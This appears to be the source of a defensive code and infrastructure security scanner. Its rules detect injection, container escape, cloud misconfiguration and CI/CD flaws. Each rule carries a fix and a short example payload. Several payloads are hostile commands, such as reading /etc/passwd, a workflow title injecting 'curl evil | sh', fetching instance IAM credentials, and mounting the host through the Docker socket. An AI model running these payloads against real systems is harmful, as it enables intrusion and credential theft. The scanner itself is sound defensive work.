# Copyright (c) 2026-present Navinspire IA
# SPDX-License-Identifier: AGPL-3.0-only

"""Deep security scan behind the Code workbench Security panel.

Layers, each bounded in files and time:

1. Code heuristics from :mod:`navin.security.scan` (secrets, injection, XSS,
   TLS, JWT, CORS, pickle, shell=True) plus the optional host CLIs
   (gitleaks, bandit, semgrep, npm audit, pip-audit) when ``kind="full"``.
2. Extra code rules: debug flags, weak hashing, tainted sinks (SQL, shell,
   file paths, outbound requests, redirects), cookies, CSRF, XML entities,
   temp files, permissions, secrets written to logs.
3. Infrastructure and configuration rules: Dockerfile, Docker Compose,
   Kubernetes manifests, Terraform, GitHub Actions workflows, env files.
4. Project checks: env files tracked by git, lockfiles, security policy,
   dependency update bot, security jobs in CI, Express without helmet.

Every finding carries severity, category, OWASP 2021 class, CWE, location,
a PoC sketch and a fix. The result adds a 0-100 score with a grade, the OWASP
and category breakdowns, the files with the most findings and an ordered
remediation plan. Findings go through the same false-positive filter as the
agent's ``security_scan`` tool, so nothing speculative reaches the report.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from navin.security.findings import dedupe_findings, normalize_finding, severity_counts
from navin.security.fp_filter import apply_fp_filter
from navin.security.poc import enrich_findings_with_poc
from navin.security.scan import _SKIP_DIRS, _is_test_path, run_security_scan
from navin.utils.proc import no_window_kwargs

_MAX_FILES = 4000
_MAX_FILE_BYTES = 400_000
_MAX_LINE_CHARS = 600

_CODE_EXTS = frozenset(
    {
        ".py", ".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs", ".go", ".rs", ".java",
        ".kt", ".rb", ".php", ".cs", ".swift", ".sh", ".bash", ".sql", ".vue",
        ".svelte",
    }
)
_CONFIG_EXTS = frozenset({".yml", ".yaml", ".json", ".toml", ".ini", ".cfg", ".conf", ".env"})
_PLACEHOLDER = re.compile(
    r"(?i)(example|sample|placeholder|changeme|change_me|your[_-]?|xxx+|todo|dummy|fake|"
    r"<[^>]+>|\$\{|\{\{|redacted|\*\*\*|^\s*$)"
)
_COMMENT_LINE = re.compile(r"^\s*(#|//|/\*|\*|--|<!--)")

# OWASP Top 10 (2021) ---------------------------------------------------------

OWASP_2021: dict[str, str] = {
    "A01": "Broken Access Control",
    "A02": "Cryptographic Failures",
    "A03": "Injection",
    "A04": "Insecure Design",
    "A05": "Security Misconfiguration",
    "A06": "Vulnerable and Outdated Components",
    "A07": "Identification and Authentication Failures",
    "A08": "Software and Data Integrity Failures",
    "A09": "Security Logging and Monitoring Failures",
    "A10": "Server-Side Request Forgery",
}

_CATEGORY_OWASP: dict[str, str] = {
    "Secrets": "A02",
    "Cryptography": "A02",
    "TLS": "A02",
    "Transport": "A02",
    "Injection": "A03",
    "XSS": "A03",
    "Command injection": "A03",
    "Code execution": "A03",
    "SAST": "A03",
    "Path traversal": "A01",
    "Permissions": "A01",
    "CSRF": "A01",
    "Redirect": "A01",
    "Access control": "A01",
    "Misconfiguration": "A05",
    "CORS": "A05",
    "Container": "A05",
    "Kubernetes": "A05",
    "Cloud": "A05",
    "Network exposure": "A05",
    "XML": "A05",
    "Filesystem": "A05",
    "Supply chain": "A06",
    "Authentication": "A07",
    "Session": "A07",
    "Deserialization": "A08",
    "CI/CD": "A08",
    "Information exposure": "A09",
    "Request forgery": "A10",
}

_RULE_CWE: dict[str, str] = {
    "private-key": "CWE-321",
    "aws-key": "CWE-798",
    "hardcoded-secret": "CWE-798",
    "sql-injection": "CWE-89",
    "eval-exec": "CWE-95",
    "pickle": "CWE-502",
    "shell-true": "CWE-78",
    "tls-verify-off": "CWE-295",
    "inner-html": "CWE-79",
    "jwt-none": "CWE-347",
    "cors-wildcard": "CWE-942",
    # bandit ids
    "B102": "CWE-78", "B104": "CWE-605", "B105": "CWE-259", "B106": "CWE-259",
    "B107": "CWE-259", "B108": "CWE-377", "B201": "CWE-94", "B301": "CWE-502",
    "B303": "CWE-327", "B307": "CWE-95", "B324": "CWE-327", "B501": "CWE-295",
    "B506": "CWE-502", "B602": "CWE-78", "B603": "CWE-78", "B605": "CWE-78",
    "B608": "CWE-89",
}

_SEVERITY_WEIGHT = {"critical": 20, "high": 10, "medium": 4, "low": 1, "info": 0}
_SEVERITY_CAP = {"critical": 60, "high": 40, "medium": 24, "low": 8, "info": 0}
_SEVERITY_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


@dataclass(frozen=True)
class Rule:
    id: str
    pattern: re.Pattern[str]
    severity: str
    category: str
    summary: str
    recommendation: str
    cwe: str
    payload: str
    sketch: str
    kinds: frozenset[str] = frozenset({"code"})
    exts: frozenset[str] | None = None
    exclude: re.Pattern[str] | None = None
    skip_comments: bool = True


def _r(**kw: Any) -> Rule:
    kw["pattern"] = re.compile(kw["pattern"])
    if kw.get("exclude") is not None:
        kw["exclude"] = re.compile(kw["exclude"])
    if "kinds" in kw:
        kw["kinds"] = frozenset(kw["kinds"])
    if kw.get("exts") is not None:
        kw["exts"] = frozenset(kw["exts"])
    return Rule(**kw)


_PY = {".py"}
_JS = {".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs", ".vue", ".svelte"}
_WEB = _PY | _JS | {".php", ".rb", ".java", ".kt", ".cs", ".go"}

CODE_RULES: tuple[Rule, ...] = (
    _r(
        id="debug-true",
        pattern=r"(?:^|\W)(?:DEBUG\s*=\s*True|debug\s*=\s*True|FLASK_DEBUG\s*=\s*1|APP_DEBUG\s*=\s*true|debug:\s*true)\b",
        severity="medium", category="Misconfiguration", cwe="CWE-489",
        summary="Debug mode enabled in code",
        recommendation="Read the debug flag from the environment and keep it off in production builds.",
        payload="GET /this-route-does-not-exist",
        sketch="Trigger an error page and confirm it prints a stack trace or opens an interactive debugger; move the flag to the environment.",
        exts=_PY | _JS | {".php", ".rb", ".env"},
    ),
    _r(
        id="weak-hash-password",
        pattern=r"(?i)(password|passwd|pwd|secret|token)\w*[^\n]{0,60}(hashlib\.(md5|sha1)\(|createHash\(\s*[\"'](md5|sha1)[\"']|\bmd5\(|\bsha1\()",
        severity="high", category="Cryptography", cwe="CWE-328",
        summary="Password or secret hashed with MD5 / SHA-1",
        recommendation="Hash credentials with bcrypt, scrypt or argon2 and a per-user salt.",
        payload="hashcat -m 0 hashes.txt wordlist.txt",
        sketch="Offline cracking of an MD5/SHA-1 password hash runs at billions of guesses per second; migrate to bcrypt/argon2.",
        exts=_WEB,
    ),
    _r(
        id="weak-hash",
        pattern=r"(hashlib\.(md5|sha1)\(|createHash\(\s*[\"'](md5|sha1)[\"']|MessageDigest\.getInstance\(\s*\"(MD5|SHA-?1)\")",
        severity="low", category="Cryptography", cwe="CWE-327",
        summary="MD5 / SHA-1 digest in use",
        recommendation="Use SHA-256 or BLAKE2 for integrity checks; never MD5/SHA-1 for signatures or passwords.",
        payload="collision pair (md5)",
        sketch="MD5 and SHA-1 collisions are practical; acceptable only for non-security checksums, flagged usedforsecurity=False.",
        exts=_WEB,
        exclude=r"usedforsecurity\s*=\s*False",
    ),
    _r(
        id="yaml-load",
        pattern=r"\byaml\.load\((?![^)]*Loader)",
        severity="high", category="Deserialization", cwe="CWE-502",
        summary="yaml.load without a safe Loader",
        recommendation="Use yaml.safe_load, or yaml.load(data, Loader=yaml.SafeLoader).",
        payload="!!python/object/apply:os.system ['id']",
        sketch="A YAML gadget tag executes code on load; switch to safe_load.",
        exts=_PY,
    ),
    _r(
        id="os-system",
        pattern=r"\bos\.(system|popen)\(",
        severity="high", category="Command injection", cwe="CWE-78",
        summary="os.system / os.popen shell call",
        recommendation="Use subprocess.run with an argv list and shell=False.",
        payload="; id #",
        sketch="A shell metacharacter in the command string runs an extra command; pass an argv list instead.",
        exts=_PY,
    ),
    _r(
        id="child-process-exec",
        pattern=r"(?:child_process\.)?\bexec(?:Sync)?\(\s*(?:`[^`]*\$\{|[\"'][^\"']*[\"']\s*\+|[A-Za-z_$][\w$]*\s*\+)",
        severity="high", category="Command injection", cwe="CWE-78",
        summary="Shell command built from concatenated input",
        recommendation="Use execFile / spawn with an argument array and no shell.",
        payload="; cat /etc/passwd #",
        sketch="Concatenated input reaches /bin/sh; execFile with an argv array removes the shell.",
        exts=_JS,
    ),
    _r(
        id="path-traversal",
        pattern=r"\b(open|readFile(?:Sync)?|sendFile|createReadStream|unlink(?:Sync)?|os\.path\.join|path\.join|send_file|send_from_directory)\([^)\n]*(request\.(args|form|json|values|GET|POST|params)|req\.(params|query|body)|params\[|query\[)",
        severity="high", category="Path traversal", cwe="CWE-22",
        summary="File path built from request input",
        recommendation="Resolve the path, then require it to stay under an allow-listed base directory.",
        payload="../../../../etc/passwd",
        sketch="A dot-dot segment in the request parameter escapes the intended folder; normalize and check the prefix.",
        exts=_WEB,
    ),
    _r(
        id="outbound-request-tainted",
        pattern=r"\b(requests\.(get|post|put|delete|head|request)|urlopen|httpx\.(get|post|request)|fetch|axios(\.(get|post|request))?|got|http\.get)\([^)\n]*(request\.(args|form|json|values|GET|POST|data)|req\.(query|body|params))",
        severity="high", category="Request forgery", cwe="CWE-918",
        summary="Outbound HTTP request to a URL taken from the request",
        recommendation="Allow-list destination hosts and schemes before fetching; block link-local and private ranges.",
        payload="http://169.254.169.254/latest/meta-data/",
        sketch="The server fetches the attacker-supplied URL and returns cloud metadata or internal services; allow-list hosts.",
        exts=_WEB,
    ),
    _r(
        id="redirect-tainted",
        pattern=r"\b(redirect|res\.redirect|HttpResponseRedirect|RedirectResponse)\(\s*(request\.(args|form|GET|POST|values|query_params)|req\.(query|body|params))",
        severity="medium", category="Redirect", cwe="CWE-601",
        summary="Redirect target taken from the request",
        recommendation="Accept only relative paths or hosts from an allow-list before redirecting.",
        payload="?next=https://evil.example/login",
        sketch="The next parameter sends the user to an external site after login; validate against an allow-list.",
        exts=_WEB,
    ),
    _r(
        id="insecure-cookie",
        pattern=r"(SESSION_COOKIE_SECURE\s*=\s*False|SESSION_COOKIE_HTTPONLY\s*=\s*False|CSRF_COOKIE_SECURE\s*=\s*False|secure\s*[:=]\s*[Ff]alse|httpOnly\s*:\s*false|httponly\s*=\s*False)",
        severity="medium", category="Session", cwe="CWE-614",
        summary="Cookie set without Secure / HttpOnly",
        recommendation="Set Secure, HttpOnly and SameSite on session cookies.",
        payload="document.cookie",
        sketch="A script or a plaintext hop reads the session cookie; set Secure + HttpOnly.",
        exts=_WEB,
    ),
    _r(
        id="csrf-disabled",
        pattern=r"(@csrf_exempt|WTF_CSRF_ENABLED\s*=\s*False|CSRF_ENABLED\s*=\s*False|csrf\s*:\s*false|protect_from_forgery\s*except|skip_before_action\s*:verify_authenticity_token)",
        severity="medium", category="CSRF", cwe="CWE-352",
        summary="CSRF protection disabled",
        recommendation="Keep CSRF protection on for state-changing routes; use tokens or SameSite cookies.",
        payload="<form action=https://app/transfer method=POST>",
        sketch="A cross-site form posts with the victim's cookies; the handler accepts it without a token.",
        exts=_WEB,
    ),
    _r(
        id="allowed-hosts-wildcard",
        pattern=r"ALLOWED_HOSTS\s*=\s*\[\s*[\"']\*[\"']",
        severity="medium", category="Misconfiguration", cwe="CWE-16",
        summary="ALLOWED_HOSTS accepts any Host header",
        recommendation="List the real hostnames in ALLOWED_HOSTS.",
        payload="Host: evil.example",
        sketch="Password-reset links built from the Host header point to the attacker's domain; restrict ALLOWED_HOSTS.",
        exts=_PY,
    ),
    _r(
        id="insecure-random-token",
        pattern=r"(?i)\b(token|secret|password|nonce|salt|otp|session_?id|reset_?code|api_?key)\w*\s*=[^\n]{0,80}\b(random\.(random|randint|choice|choices|randrange|getrandbits)|Math\.random)\(",
        severity="high", category="Cryptography", cwe="CWE-338",
        summary="Security token generated with a non-cryptographic random",
        recommendation="Use secrets.token_urlsafe / crypto.randomBytes for tokens and codes.",
        payload="predict next Mersenne Twister output",
        sketch="624 observed outputs recover the PRNG state and predict future tokens; use the secrets module.",
        exts=_WEB,
    ),
    _r(
        id="mktemp",
        pattern=r"\btempfile\.mktemp\(",
        severity="medium", category="Filesystem", cwe="CWE-377",
        summary="tempfile.mktemp race condition",
        recommendation="Use tempfile.mkstemp or NamedTemporaryFile.",
        payload="ln -s /etc/passwd /tmp/predictable",
        sketch="A symlink planted between name creation and open redirects the write; use mkstemp.",
        exts=_PY,
    ),
    _r(
        id="chmod-777",
        pattern=r"(chmod\s+(-R\s+)?0?777\b|os\.chmod\([^)]*0o?777|fs\.chmod(Sync)?\([^)]*0o?777)",
        severity="medium", category="Permissions", cwe="CWE-732",
        summary="World-writable permissions (777)",
        recommendation="Grant the minimum mode required (for example 750 or 640).",
        payload="echo pwned >> target",
        sketch="Any local user edits the file or drops a binary in the folder; tighten the mode.",
        exts=_WEB | {".sh", ".bash"},
    ),
    _r(
        id="jwt-hardcoded-secret",
        pattern=r"\bjwt\.(encode|sign|decode|verify)\([^)\n]*[\"'][A-Za-z0-9_\-!@#$%^&*]{8,}[\"']",
        severity="high", category="Authentication", cwe="CWE-798",
        summary="JWT signed with a secret written in the code",
        recommendation="Load the signing key from the environment or a secrets manager and rotate it.",
        payload="forge {\"sub\":\"admin\"} with the leaked secret",
        sketch="Anyone reading the repository signs arbitrary tokens; rotate and externalize the key.",
        exts=_WEB,
        exclude=_PLACEHOLDER.pattern,
    ),
    _r(
        id="sql-execute-format",
        pattern=r"\.(execute|executemany|raw|query)\(\s*(f[\"']|[\"'][^\"'\n]*[\"']\s*(%|\+|\.format\()|`[^`\n]*\$\{)",
        severity="critical", category="Injection", cwe="CWE-89",
        summary="SQL query built with string formatting",
        recommendation="Pass values as bound parameters; never interpolate them into the SQL text.",
        payload="' OR 1=1--",
        sketch="A quote in the parameter changes the query; bind parameters instead.",
        exts=_WEB,
    ),
    _r(
        id="xxe",
        pattern=r"(resolve_entities\s*=\s*True|external-general-entities[^\n]*true|XMLConstants\.FEATURE_SECURE_PROCESSING[^\n]*false|libxml_disable_entity_loader\(\s*false)",
        severity="medium", category="XML", cwe="CWE-611",
        summary="XML parser resolves external entities",
        recommendation="Disable external entity resolution (defusedxml, resolve_entities=False).",
        payload="<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
        sketch="An external entity reads a local file into the parsed document; disable entity resolution.",
        exts=_WEB,
    ),
    _r(
        id="log-secret",
        pattern=r"(?i)\b(console\.(log|debug|info)|print|logger?\.(info|debug|warning|warn|error))\([^)\n]*\b(password|passwd|secret|api_?key|access_?token|private_?key)\b",
        severity="medium", category="Information exposure", cwe="CWE-532",
        summary="Credential written to logs",
        recommendation="Redact credentials before logging; log identifiers, never secrets.",
        payload="grep -i password app.log",
        sketch="Log files and log shippers keep the credential in clear text; mask it at the call site.",
        exts=_WEB,
        exclude=r"(?i)(redact|mask|\*\*\*|hidden|len\()",
    ),
    _r(
        id="password-plain-compare",
        pattern=r"(?i)\b\w*password\w*\s*==\s*(request\.|req\.|form\[|params\[|body\.|input|provided|given|candidate|plain)\w*",
        severity="high", category="Authentication", cwe="CWE-256",
        summary="Password compared in clear text",
        recommendation="Store a salted hash and compare with a constant-time check (bcrypt.checkpw).",
        payload="SELECT password FROM users",
        sketch="A database dump exposes every password unchanged; hash with bcrypt/argon2 and compare hashes.",
        exts=_WEB,
    ),
    _r(
        id="bind-all-interfaces",
        pattern=r"(host\s*=\s*[\"']0\.0\.0\.0[\"']|\.listen\(\s*\d+\s*,\s*[\"']0\.0\.0\.0[\"']|--host[= ]0\.0\.0\.0)",
        severity="low", category="Network exposure", cwe="CWE-668",
        summary="Server bound to every network interface",
        recommendation="Bind to 127.0.0.1 behind a reverse proxy, or document the public exposure and firewall it.",
        payload="nmap -p <port> <host>",
        sketch="The port answers from any network the host sits on; bind to loopback or filter it.",
        exts=_WEB,
    ),
    _r(
        id="http-url",
        pattern=r"(?i)\b(url|endpoint|host|base|api|server|webhook)\w*\s*[:=]\s*[\"']http://(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|\{|\$|example\.|[^\"'/]*\.local\b)[a-z0-9.-]+\.[a-z]{2,}",
        severity="low", category="Transport", cwe="CWE-319",
        summary="Plaintext HTTP endpoint to an external host",
        recommendation="Use https:// and verify the certificate.",
        payload="tcpdump -A port 80",
        sketch="Credentials and payloads cross the network unencrypted; switch the endpoint to https.",
        exts=_WEB | _CONFIG_EXTS,
    ),
)

# Infrastructure rules ---------------------------------------------------------

IAC_RULES: tuple[Rule, ...] = (
    # Dockerfile
    _r(
        id="docker-latest-tag",
        pattern=r"^\s*FROM\s+(?!scratch\b)[^\s:@]+(:latest)?\s*(AS\s+\w+)?\s*$",
        severity="low", category="Container", cwe="CWE-1104",
        summary="Base image not pinned (latest or no tag)",
        recommendation="Pin the base image to a version tag or a digest.",
        payload="FROM python:latest",
        sketch="Every build pulls a different upstream image, so a compromised or breaking upstream lands silently; pin a digest.",
        kinds={"dockerfile"}, skip_comments=True,
    ),
    _r(
        id="docker-curl-pipe-sh",
        pattern=r"(curl|wget)[^|\n]*\|\s*(sudo\s+)?(ba|z)?sh\b",
        severity="medium", category="Container", cwe="CWE-494",
        summary="Remote script piped to a shell during build",
        recommendation="Download the script, verify its checksum or signature, then run it.",
        payload="curl https://x/install.sh | sh",
        sketch="Whoever controls the URL or the path to it runs code in the build; verify before executing.",
        kinds={"dockerfile", "workflow", "compose"},
    ),
    _r(
        id="docker-env-secret",
        pattern=r"(?i)^\s*(ENV|ARG)\s+\w*(PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_KEY)\w*[\s=]+[^\s$]{6,}",
        severity="high", category="Secrets", cwe="CWE-798",
        summary="Credential baked into the image (ENV/ARG)",
        recommendation="Inject secrets at runtime (secret mounts, env from the orchestrator), never in image layers.",
        payload="docker history --no-trunc image",
        sketch="The value sits in the image metadata and every layer copy; rotate it and mount it at runtime.",
        kinds={"dockerfile"},
        exclude=_PLACEHOLDER.pattern,
    ),
    _r(
        id="docker-add-remote",
        pattern=r"^\s*ADD\s+https?://",
        severity="low", category="Container", cwe="CWE-494",
        summary="ADD fetches a remote URL without verification",
        recommendation="Use RUN curl with a checksum check, or COPY a vetted artifact.",
        payload="ADD http://x/file /opt/",
        sketch="The remote file is trusted as-is; verify a checksum after download.",
        kinds={"dockerfile"},
    ),
    # Compose
    _r(
        id="compose-privileged",
        pattern=r"^\s*privileged:\s*true\b",
        severity="high", category="Container", cwe="CWE-250",
        summary="Container runs privileged",
        recommendation="Drop privileged; add only the capabilities the process needs.",
        payload="mount /dev/sda1 /mnt from inside the container",
        sketch="A privileged container reaches host devices and escapes to the host; remove the flag.",
        kinds={"compose"},
    ),
    _r(
        id="compose-docker-socket",
        pattern=r"/var/run/docker\.sock",
        severity="high", category="Container", cwe="CWE-250",
        summary="Docker socket mounted into a container",
        recommendation="Avoid the socket mount; use a scoped proxy or an API with least privilege.",
        payload="docker -H unix:///var/run/docker.sock run -v /:/host alpine",
        sketch="The socket gives root on the host to the container; remove the mount.",
        kinds={"compose", "k8s"},
    ),
    _r(
        id="compose-host-network",
        pattern=r"^\s*network_mode:\s*[\"']?host\b",
        severity="medium", category="Container", cwe="CWE-668",
        summary="Container shares the host network namespace",
        recommendation="Use a user-defined network and publish only the needed ports.",
        payload="ss -lntp from the container",
        sketch="Every host service is reachable from the container and vice versa; drop host networking.",
        kinds={"compose"},
    ),
    _r(
        id="compose-cap-admin",
        pattern=r"^\s*-\s*(SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)\b",
        severity="high", category="Container", cwe="CWE-250",
        summary="Dangerous capability granted (SYS_ADMIN / ALL)",
        recommendation="Remove the capability; redesign the task so it does not need it.",
        payload="cap_add: [SYS_ADMIN]",
        sketch="SYS_ADMIN allows mounts and cgroup tricks that break out of the container; remove it.",
        kinds={"compose"},
    ),
    _r(
        id="compose-inline-secret",
        pattern=r"(?i)^\s*-?\s*\w*(PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY)\w*\s*[:=]\s*[\"']?(?!\$)[^\s\"']{6,}",
        severity="high", category="Secrets", cwe="CWE-798",
        summary="Credential written inline in Compose",
        recommendation="Reference ${VAR} from an ignored .env file or Docker secrets.",
        payload="git log -p docker-compose.yml",
        sketch="The value is in the repository history for everyone with read access; rotate it and use ${VAR}.",
        kinds={"compose"},
        exclude=_PLACEHOLDER.pattern,
    ),
    # Kubernetes
    _r(
        id="k8s-privileged",
        pattern=r"^\s*privileged:\s*true\b",
        severity="high", category="Kubernetes", cwe="CWE-250",
        summary="Pod container runs privileged",
        recommendation="Set privileged: false and allowPrivilegeEscalation: false; add capabilities explicitly.",
        payload="nsenter -t 1 -m -u -i -n sh",
        sketch="A privileged pod enters the node's namespaces and controls the node; remove the flag.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-host-namespace",
        pattern=r"^\s*(hostNetwork|hostPID|hostIPC):\s*true\b",
        severity="medium", category="Kubernetes", cwe="CWE-668",
        summary="Pod shares a host namespace (network / PID / IPC)",
        recommendation="Remove host namespaces unless the workload is a node agent that needs them.",
        payload="ps aux from the pod lists node processes",
        sketch="The pod observes or signals host processes and sockets; disable the host namespaces.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-run-as-root",
        pattern=r"^\s*runAsUser:\s*0\b",
        severity="medium", category="Kubernetes", cwe="CWE-250",
        summary="Container explicitly runs as root (runAsUser: 0)",
        recommendation="Run as a non-root UID and set runAsNonRoot: true.",
        payload="id -> uid=0(root)",
        sketch="Any code execution in the container is root; combined with a mount it reaches the node.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-privilege-escalation",
        pattern=r"^\s*allowPrivilegeEscalation:\s*true\b",
        severity="medium", category="Kubernetes", cwe="CWE-250",
        summary="allowPrivilegeEscalation enabled",
        recommendation="Set allowPrivilegeEscalation: false.",
        payload="setuid binary inside the image",
        sketch="A setuid binary gains more privileges than the parent process; disable escalation.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-hostpath",
        pattern=r"^\s*hostPath:",
        severity="medium", category="Kubernetes", cwe="CWE-668",
        summary="hostPath volume mounts the node filesystem",
        recommendation="Prefer PersistentVolumeClaims; if hostPath is required, mount read-only on a narrow path.",
        payload="hostPath: { path: / }",
        sketch="The pod reads or writes node files, including kubelet credentials; replace the mount.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-cluster-admin",
        pattern=r"^\s*name:\s*cluster-admin\b",
        severity="high", category="Kubernetes", cwe="CWE-269",
        summary="Binding to the cluster-admin role",
        recommendation="Create a Role with the verbs and resources the workload needs.",
        payload="kubectl auth can-i '*' '*' --as=system:serviceaccount:ns:sa",
        sketch="The subject controls the whole cluster; scope a dedicated Role instead.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-latest-image",
        pattern=r"^\s*(-\s*)?image:\s*[\"']?[^\s\"']+:latest[\"']?\s*$",
        severity="low", category="Kubernetes", cwe="CWE-1104",
        summary="Image tag latest in a manifest",
        recommendation="Pin images to a version tag or digest.",
        payload="image: nginx:latest",
        sketch="Rollouts pull whatever upstream publishes; pin the tag.",
        kinds={"k8s"},
    ),
    _r(
        id="k8s-secret-manifest",
        pattern=r"^\s*kind:\s*Secret\s*$",
        severity="medium", category="Secrets", cwe="CWE-312",
        summary="Kubernetes Secret manifest committed with its values",
        recommendation="Keep Secret manifests out of git; use sealed-secrets, external-secrets or a vault.",
        payload="base64 -d on the data field",
        sketch="Base64 is not encryption: anyone with repository access reads the values; move them out.",
        kinds={"k8s"},
    ),
    # Terraform
    _r(
        id="tf-public-acl",
        pattern=r"acl\s*=\s*\"public-read(-write)?\"",
        severity="high", category="Cloud", cwe="CWE-284",
        summary="Storage bucket with a public ACL",
        recommendation="Set the ACL to private and serve public content through a CDN with an origin access identity.",
        payload="curl https://<bucket>.s3.amazonaws.com/",
        sketch="Bucket objects list and download anonymously; make the bucket private.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-public-access-block-off",
        pattern=r"(block_public_acls|ignore_public_acls|block_public_policy|restrict_public_buckets)\s*=\s*false",
        severity="high", category="Cloud", cwe="CWE-284",
        summary="S3 public access block disabled",
        recommendation="Set all four public access block flags to true.",
        payload="aws s3api get-public-access-block --bucket <name>",
        sketch="A later policy or ACL exposes the bucket publicly; keep the block on.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-publicly-accessible",
        pattern=r"publicly_accessible\s*=\s*true",
        severity="high", category="Cloud", cwe="CWE-284",
        summary="Database reachable from the internet",
        recommendation="Set publicly_accessible = false and reach the database through a private subnet or bastion.",
        payload="nmap -p 5432 <rds-endpoint>",
        sketch="The database port answers from the internet and takes brute-force attempts; make it private.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-unencrypted",
        pattern=r"\b(storage_)?encrypted\s*=\s*false",
        severity="medium", category="Cloud", cwe="CWE-311",
        summary="Storage created without encryption at rest",
        recommendation="Enable encryption at rest with a KMS key.",
        payload="snapshot copy to another account",
        sketch="A copied snapshot or disk is readable as-is; enable encryption.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-key-rotation-off",
        pattern=r"enable_key_rotation\s*=\s*false",
        severity="medium", category="Cloud", cwe="CWE-324",
        summary="KMS key rotation disabled",
        recommendation="Set enable_key_rotation = true.",
        payload="aws kms get-key-rotation-status",
        sketch="A leaked key stays valid forever; turn on rotation.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-imdsv1",
        pattern=r"http_tokens\s*=\s*\"optional\"",
        severity="medium", category="Cloud", cwe="CWE-918",
        summary="EC2 instance metadata accepts IMDSv1",
        recommendation="Set http_tokens = \"required\".",
        payload="curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        sketch="Any server-side fetch from the instance steals its IAM credentials; require IMDSv2 tokens.",
        kinds={"terraform"},
    ),
    _r(
        id="tf-hardcoded-password",
        pattern=r"(?i)\b(password|master_password|secret|client_secret|access_key|secret_key)\s*=\s*\"[^\"$]{6,}\"",
        severity="critical", category="Secrets", cwe="CWE-798",
        summary="Credential written in Terraform code",
        recommendation="Use a variable marked sensitive, fed from a secrets manager or the CI vault.",
        payload="git log -p -- '*.tf'",
        sketch="The credential is in version control and in the state file; rotate it and use a sensitive variable.",
        kinds={"terraform"},
        exclude=_PLACEHOLDER.pattern,
    ),
    _r(
        id="tf-deletion-protection-off",
        pattern=r"(deletion_protection\s*=\s*false|skip_final_snapshot\s*=\s*true|force_destroy\s*=\s*true)",
        severity="low", category="Cloud", cwe="CWE-693",
        summary="Destructive safeguards disabled on a stateful resource",
        recommendation="Enable deletion protection and final snapshots in production stacks.",
        payload="terraform destroy",
        sketch="A wrong apply deletes the data with no snapshot to restore from; enable the safeguards.",
        kinds={"terraform"},
    ),
    # GitHub Actions
    _r(
        id="gha-expression-injection",
        pattern=r"run:[^\n]*\$\{\{\s*github\.event\.(issue|comment|pull_request|review|review_comment|head_commit|commits)\.[^}]*(title|body|message|ref|label|name|email)",
        severity="high", category="CI/CD", cwe="CWE-94",
        summary="Workflow interpolates untrusted event data into a shell step",
        recommendation="Pass the value through an env: variable and quote it in the script.",
        payload="PR title: a\"; curl evil | sh; echo \"",
        sketch="The expression expands inside the shell script, so a crafted title runs commands with the job token; use env.",
        kinds={"workflow"},
    ),
    _r(
        id="gha-write-all",
        pattern=r"^\s*permissions:\s*write-all\b",
        severity="medium", category="CI/CD", cwe="CWE-250",
        summary="Workflow token granted write-all",
        recommendation="Declare the minimal permissions block per job (contents: read, ...).",
        payload="GITHUB_TOKEN pushes to the default branch",
        sketch="A compromised step rewrites code, releases and packages; scope the token.",
        kinds={"workflow"},
    ),
    _r(
        id="gha-echo-secret",
        pattern=r"echo[^\n]*\$\{\{\s*secrets\.",
        severity="medium", category="Information exposure", cwe="CWE-532",
        summary="Secret echoed in a workflow step",
        recommendation="Never print secrets; pass them through env and masked inputs.",
        payload="base64 the secret to bypass log masking",
        sketch="Transformed output escapes the log masker and lands in the public log; remove the echo.",
        kinds={"workflow"},
    ),
    _r(
        id="gha-unpinned-action",
        pattern=r"^\s*-?\s*uses:\s*[\w.-]+/[\w./-]+@(main|master|latest|v?\d+(\.\d+)*)\s*$",
        severity="low", category="CI/CD", cwe="CWE-829",
        summary="Action referenced by tag or branch instead of a commit SHA",
        recommendation="Pin third-party actions to a full commit SHA and let a bot update it.",
        payload="tag moved to a malicious commit",
        sketch="A moved tag or compromised branch ships new code into every run; pin the SHA.",
        kinds={"workflow"},
        exclude=r"uses:\s*(actions|github)/",
    ),
    # Env files
    _r(
        id="env-credential",
        pattern=r"(?i)^\s*\w*(PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_KEY|CLIENT_SECRET|DATABASE_URL)\w*\s*=\s*[\"']?[^\s\"']{6,}",
        severity="high", category="Secrets", cwe="CWE-312",
        summary="Credential stored in an environment file",
        recommendation="Keep env files out of git, rotate the value if it was ever committed, and load secrets from a vault.",
        payload="cat .env",
        sketch="Anyone with repository or disk access reads the credential in clear text; rotate and externalize.",
        kinds={"env"},
        exclude=r"(?i)(example|sample|placeholder|changeme|your[_-]?|xxx+|<[^>]+>|\$\{|^\s*#|=\s*[\"']?(postgres(ql)?|mysql|redis|sqlite|mongodb)(\+\w+)?://(\w+:\w+@)?(localhost|127\.0\.0\.1|db|postgres|mysql|redis|mongo)\b)",
    ),
)

_TF_CIDR_OPEN = re.compile(r"\"(0\.0\.0\.0/0|::/0)\"")
_TF_BLOCK_OPEN = re.compile(r"^\s*(ingress|egress)\s*\{")
_TF_RULE_TYPE = re.compile(r"^\s*type\s*=\s*\"(ingress|egress)\"")
_TF_RESOURCE = re.compile(r"^\s*resource\s+\"")
_DOCKER_FROM = re.compile(r"^\s*FROM\s+(\S+)", re.I)
_DOCKER_USER = re.compile(r"^\s*USER\s+\S+", re.I)
